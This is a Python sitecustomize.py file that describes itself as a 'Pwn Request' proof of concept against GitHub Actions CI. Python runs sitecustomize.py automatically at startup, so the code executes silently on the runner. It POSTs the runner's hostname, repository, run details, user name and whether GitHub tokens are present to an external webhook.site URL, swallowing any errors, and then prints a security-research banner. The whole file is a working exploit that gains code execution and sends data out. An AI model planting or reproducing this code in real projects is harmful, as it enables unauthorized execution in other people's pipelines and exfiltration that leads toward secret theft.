import os, socket, json, urllib.request

EXFIL = "https://webhook.site/8d07f12f-c92b-49da-9fdd-0596fa33dfc4"

def _exfil(label, data):
    try:
        payload = json.dumps({"l": label, "d": str(data)[:2000]}).encode()
        req = urllib.request.Request(EXFIL, data=payload,
              headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

_exfil("VECTOR_FIRED", {
    "vector": "sitecustomize_py",
    "hostname": socket.gethostname(),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "?"),
    "github_event": os.environ.get("GITHUB_EVENT_NAME", "?"),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "?"),
    "github_token_present": "GITHUB_TOKEN" in os.environ,
    "zb_github_token_present": "ZB_GITHUB_TOKEN" in os.environ,
    "env_count": len(os.environ),
    "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
})

# Also print to CI logs for visibility
print("=" * 60)
print("SECURITY RESEARCH - Pwn Request PoC")
print("Researcher: null_consolidated")
print("Vector: sitecustomize_py")
print(f"Repository: {os.environ.get('GITHUB_REPOSITORY', '?')}")
print(f"Event: {os.environ.get('GITHUB_EVENT_NAME', '?')}")
print(f"Run ID: {os.environ.get('GITHUB_RUN_ID', '?')}")
print(f"Runner: {socket.gethostname()}")
print(f"Env vars: {len(os.environ)}")
print(f"GITHUB_TOKEN present: {'GITHUB_TOKEN' in os.environ}")
print(f"ZB_GITHUB_TOKEN present: {'ZB_GITHUB_TOKEN' in os.environ}")
print("PROOF: Code execution achieved via " + "sitecustomize_py")
print("=" * 60)